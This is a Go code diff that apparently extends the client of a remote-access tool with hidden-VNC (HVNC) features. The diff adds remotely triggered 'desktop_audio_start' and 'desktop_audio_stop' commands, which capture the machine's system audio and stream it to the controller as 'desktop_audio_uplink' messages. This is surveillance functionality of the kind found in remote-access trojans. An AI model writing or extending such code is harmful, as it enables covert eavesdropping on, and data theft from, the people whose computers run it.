@@ -29,13 +29,15 @@ import (
 var ErrReconnect = errors.New("reconnect requested")
 
 var (
-	activeCommands   = make(map[string]context.CancelFunc)
-	activeCommandsMu sync.Mutex
-	voiceSessionMu   sync.Mutex
-	voiceSession     *voiceRuntime
-	hvncInputOnce    sync.Once
-	hvncInputQueue   chan hvncInputEvent
-	hvncInputDropped atomic.Uint64
+	activeCommands      = make(map[string]context.CancelFunc)
+	activeCommandsMu    sync.Mutex
+	voiceSessionMu      sync.Mutex
+	voiceSession        *voiceRuntime
+	desktopAudioMu      sync.Mutex
+	desktopAudioSession *voiceRuntime
+	hvncInputOnce       sync.Once
+	hvncInputQueue      chan hvncInputEvent
+	hvncInputDropped    atomic.Uint64
 )
 
 type hvncInputKind int
@@ -452,6 +454,54 @@ func writeVoiceDownlink(data []byte) error {
 	if err := v.session.WritePlayback(data); err != nil {
 		return err
 	}
+	return nil
+}
+
+func stopDesktopAudioSession() {
+	desktopAudioMu.Lock()
+	v := desktopAudioSession
+	desktopAudioSession = nil
+	desktopAudioMu.Unlock()
+	if v == nil {
+		return
+	}
+	if v.cancel != nil {
+		v.cancel()
+	}
+	if v.session != nil {
+		_ = v.session.Close()
+	}
+}
+
+func startDesktopAudioSession(ctx context.Context, env *runtime.Env, sessionID string, source string) error {
+	if sessionID == "" {
+		return errors.New("missing desktop audio session id")
+	}
+
+	stopDesktopAudioSession()
+
+	vCtx, cancel := context.WithCancel(ctx)
+	session, err := audio.StartCaptureOnlySession(vCtx, source, func(chunk []byte) {
+		if len(chunk) == 0 {
+			return
+		}
+		msg := map[string]interface{}{
+			"type":      "desktop_audio_uplink",
+			"sessionId": sessionID,
+			"data":      chunk,
+		}
+		_ = wire.WriteMsg(vCtx, env.Conn, msg)
+	})
+	if err != nil {
+		cancel()
+		return err
+	}
+
+	v := &voiceRuntime{sessionID: sessionID, cancel: cancel, session: session}
+	desktopAudioMu.Lock()
+	desktopAudioSession = v
+	desktopAudioMu.Unlock()
+
 	return nil
 }
 
@@ -1754,6 +1804,22 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		caps := audio.ProbeCapabilities()
 		payload, _ := json.Marshal(caps)
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: caps.Available, Message: string(payload)})
+	case "desktop_audio_start":
+		sessionID, _ := envelopePayloadString(envelope, "sessionId")
+		source := "system"
+		payload, _ := envelope["payload"].(map[string]interface{})
+		if payload != nil {
+			if v, ok := payload["source"].(string); ok && strings.TrimSpace(v) != "" {
+				source = strings.TrimSpace(v)
+			}
+		}
+		if err := startDesktopAudioSession(ctx, env, sessionID, source); err != nil {
+			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
+		}
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
+	case "desktop_audio_stop":
+		stopDesktopAudioSession()
+		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	}
 
 	switch action {
